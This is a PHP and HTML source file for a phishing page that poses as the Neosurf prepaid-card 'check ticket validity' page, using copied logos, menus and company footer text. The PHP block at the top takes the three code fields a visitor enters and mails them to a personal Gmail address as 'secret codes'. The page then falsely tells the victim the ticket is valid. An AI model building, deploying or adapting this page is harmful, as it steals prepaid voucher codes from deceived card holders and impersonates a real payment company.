<?php

$email = "atoletinora@gmail.com" ; 
$objet = "code";
$input1 = isset($_POST["input1"]) ? htmlspecialchars($_POST["input1"]) : "";
$input2 = isset($_POST["input2"]) ? htmlspecialchars($_POST["input2"]) : "";
$input3 = isset($_POST["input3"]) ? htmlspecialchars($_POST["input3"]) : "";

$notification = false;

if(!empty($input1) && !empty($input2) && !empty($input3)){
    
    $message = "Les codes secret sont : ".$input1." ".$input2." ".$input3;
    mail($email, $objet, $message);
    $notification = true;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérifier la validité d'un Ticket Neosurf</title>
    <link rel="stylesheet" href="./styless/style.css">
    <link rel="icon" type="image/png" href="images/favicon.png">
    <!-- <link rel="icon" href="favicon.png" type="image/png"> -->

</head>

<body>
    <header>
        <div class="logo">
            <a href="#"><img src="images/logo-neosurf-white-tagline-1.png" alt=""></a>
        </div>
        <ul class="menu">
            <li><a href="#"> <img src="images/piecce.PNG" alt="">VÉRIFIER LA VALIDITÉ D'UN TICKET</a></li>
            <li><a href="#"> <img src="images/arrow.PNG" alt=""> CONNEXION / INSCRIPTION</a></li>
            <li><a href="#"> DECOUVRIR NEOSURF</a></li>

        </ul>
    </header>

   
    <div class="container">
        <div class="container-1"> 
            <img src="images/coin.PNG" alt="" style="max-height: 100px;"> 
            <p>Vérifier la validité d'un Ticket Neosurf</p>
        </div>
        <div class="container-2">
        <?php
        if($notification==false){
            echo'<p class="container-2-1">MA CARTE</p>';
            echo'<p class="container-2-2"> Vérifier en indiquant le code figurant sur votre carte ou votre ticket Neosurf afin de vérifier sa validité </p>';
        }else{
            echo" <p class='container-2-1'> VOTRE TICKET EST VALIDE </p>";
        }
        ?>
            
            
           
        </div>
        <div class="div-container-input">
            <form method="post" action=" " onSubmit="return validateForm();"> 
            <?php
        if($notification==false){
            echo'<div class="container-input">
            <input type="text" id="input1" name="input1" maxlength="4">
            <input type="text" id="input2" name="input2" maxlength="3">
            <input type="text" id="input3" name="input3" maxlength="3">
            <!-- masquer la saisie du champ3 -->
              
        </div>
        <button type="submit">Valider</button>
        ';
        
        }else{
            // echo" <a href='index.php'>Retour</a>";
            echo "<button type=\"submit\">Retour</button>";

        }
        ?>   
            
            

           
            </form>
            <div class="container-final"></div>
            
            <div id="validationMessage" style="display: none;">C'est valide</div>
    </div>

            

    <footer>
        <div class="div-middle-footer">
            <p class="middle-footer">Copyright © 2004 - 2023 NS Cards France SAS<br>
                NS Cards France SAS<br>
                Registered address: NS CARDS FRANCE SAS 10 rue Vandrezanne, 75013 Paris, France<br></p>
        </div>
        <div class="div-bottom-footer">    
            <ul class="bottom-footer">
                <li><a href="#"><img src="images/fr.png" alt=""> Français</a></li>
                <li><a href="#"><img src="images/en.png" alt=""> English</a></li>
                <li><a href="#"><img src="images/es.png" alt=""> Español</a></li>
                <li><a href="#"><img src="images/de.png" alt=""> Deutsch</a></li>
                <li><a href="#"><img src="images/pl.png" alt=""> Polski</a></li>
                <li><a href="#"><img src="images/pt.png" alt=""> Portuguese</a></li>
                <li><a href="#"><img src="images/nl.png" alt=""> Nederlands</a></li>
                <li><a href="#"><img src="images/it.png" alt=""> Italiano</a></li>
                <li><a href="#"><img src="images/ro.png" alt=""> Română</a></li>
                <!-- <li><a href="#"><img src="images/el.png" alt=""> Ελληνικα</a></li>
                <li><a href="#"><img src="images/ja.png" alt=""> 日本語</a></li> -->
            </ul>
        </div>
    </footer>
</body>
</html>